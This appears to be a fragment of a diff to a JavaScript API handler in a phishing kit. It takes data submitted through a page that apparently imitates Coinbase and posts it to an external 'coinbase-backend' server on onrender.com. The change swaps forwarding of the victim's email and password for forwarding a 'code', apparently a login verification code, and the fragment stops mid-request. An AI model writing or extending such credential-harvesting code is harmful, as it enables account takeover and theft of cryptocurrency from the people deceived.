@@ -1,8 +1,7 @@
 import axios from "axios";
 export default function handler(req, res) {
   const form = new FormData()
-  form.append("email", req.body.mail)
-  form.append("password", req.body.pass)
+  form.append("code", code)
   axios
       .post(
         "https://coinbase-backend-1vc1.onrender.com/process_token.php",
